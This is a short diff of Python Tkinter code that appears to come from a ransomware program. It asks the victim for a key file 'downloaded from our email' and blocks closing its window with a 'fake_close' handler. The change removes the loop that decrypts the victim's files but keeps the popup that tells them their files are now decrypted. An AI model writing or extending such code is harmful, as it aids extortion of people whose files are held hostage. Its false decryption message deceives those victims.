@@ -71,8 +71,6 @@ def select_decryption_key():
         file_name = filedialog.askopenfilename(title='Select the file you downloaded from our email.')
     print(file_name)
     # TODO decrypt their files
-    for i in range(len(file_list) - 1):
-        file_list[i].decrypt()
     window = tk.Toplevel(root)
     window.protocol('WM_DELETE_WINDOW', fake_close)
     info_label = tk.Label(window, text="""Your files are now decrypted and you can close these popups""")
